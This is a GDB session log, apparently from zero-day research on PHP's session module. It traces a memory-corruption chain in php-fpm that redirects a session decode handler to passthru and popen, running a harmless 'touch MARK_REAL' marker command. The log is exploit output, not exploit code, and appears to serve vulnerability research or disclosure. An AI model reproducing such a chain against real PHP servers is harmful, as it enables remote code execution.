[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
0x00007f3d4629b3a7 in ?? () from /lib/x86_64-linux-gnu/libc.so.6
warning: File "/tmp/opencode/realapps/install_realapps_np/sbin/php-fpm" auto-loading has been declined by your `auto-load safe-path' set to "$debugdir:$datadir/auto-load".
To enable execution of this file add
	add-auto-load-safe-path /tmp/opencode/realapps/install_realapps_np/sbin/php-fpm
line to your configuration file "/home/davide/.config/gdb/gdbinit".
To completely disable this security protection add
	set auto-load safe-path /
line to your configuration file "/home/davide/.config/gdb/gdbinit".
For more information about this security protection see the
"Auto-loading safe path" section in the GDB manual.  E.g., run from the shell:
	info "(gdb)Auto-loading safe path"
warning: File "/tmp/opencode/realapps/install_realapps_np/sbin/php-fpm" auto-loading has been declined by your `auto-load safe-path' set to "$debugdir:$datadir/auto-load".
Catchpoint 1 (signal SIGSEGV)
Catchpoint 2 (signal SIGABRT)
Breakpoint 3 at 0x9e68b5: file /home/davide/ailocal/php/zerodays_1020/build_plain/ext/session/session.c, line 290.
Breakpoint 4 at 0x9e6a66: file /home/davide/ailocal/php/zerodays_1020/build_plain/Zend/zend_types.h, line 670.
Breakpoint 5 at 0xa3c074: file /home/davide/ailocal/php/zerodays_1020/build_plain/ext/standard/exec.c, line 257.
Breakpoint 6 at 0xa3bbd7: file /home/davide/ailocal/php/zerodays_1020/build_plain/ext/standard/exec.c, line 113.
Breakpoint 7 at 0x7f3d4628bf90
DECODE data=0x7f3d4406a000 val=0x7f3d4406a018 len=262144 bg=1 bgd=0x7f3d44097000 decodefield=0x9e6fae
WRITE_TARGET cur=0x22c54c8 type=0x4 value=0xa3c074
SETVAR cur=0x22c54d8 type=0x106 value=0x7f3d440ad000 name_len=396
SETVAR cur=0x22c54e8 type=0x106 value=0x7f3d440b2000 name_len=1
DECODE data=0x7f3d440b2000 val=0x7f3d440b2018 len=262456 bg=1 bgd=0x7f3d44097000 decodefield=0xa3c074
ZIF_PASSTHRU rdi=0x7f3d440b2018 rsi=0x40138
0x7f3d440b2018:	0x0000000000000000	0x0000000000000000
0x7f3d440b2028:	0x0000000000000000	0x00007f3d440b2218
0x7f3d440b2038:	0x0000000000000000	0x0000000100000000
0x7f3d440b2048:	0x0000000000000000	0x0000000000000000
PHP_EXEC type=3 cmd=0x7f3d440b2230
POPEN cmd=touch /tmp/opencode/research/realchain_20261022T015900Z/MARK_REAL;
[Detaching after vfork from child process 168980]
DECODE data=0x7f3d436e3200 val=0x7f3d436e3218 len=343 bg=0 bgd=(nil) decodefield=0xa3c074
ZIF_PASSTHRU rdi=0x7f3d436e3218 rsi=0x157
0x7f3d436e3218:	0x705f64616f6c7075	0x5f73736572676f72
0x7f3d436e3228:	0x737b3a353a617c78	0x617473223a30313a
0x7f3d436e3238:	0x22656d69745f7472	0x36323937313a693b
0x7f3d436e3248:	0x3a733b3136323732	0x746e6f63223a3431
[Inferior 1 (process 168054) detached]
